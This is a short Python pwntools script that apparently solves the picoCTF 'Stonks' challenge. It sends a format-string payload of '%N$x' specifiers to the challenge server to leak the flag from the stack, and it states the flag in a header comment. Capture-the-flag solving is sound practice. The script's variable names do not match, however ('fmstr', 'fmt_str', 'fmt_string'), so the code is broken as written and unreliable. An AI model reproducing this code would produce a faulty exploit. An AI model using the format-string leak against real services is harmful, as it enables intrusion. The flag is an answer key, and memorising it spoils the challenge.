#!/usr/bin/env python3

from pwn import *

# Category: Binary Exploitation
# Chall: Stonks
# Points: 20
# Description: I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 16439
# Gist: Format String (like Gauntlet 0 but flag broken up across several bytes)
# Flag: picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
# Solved by: Ryan Nguyen (6 days in comp)

fmstr = ""

def main():
	for i in range(15,24):
		fmt_str += "%" + str(i) + "$x "
	r = remote("mercury.picoctf.net", 16439)
	r.recvuntil("portfolio")
	r.sendline("1")
	r.recvuntil("token?")
	r.sendline(fmt_string)
	r.interactive()


if __name__ == "__main__":
    main()
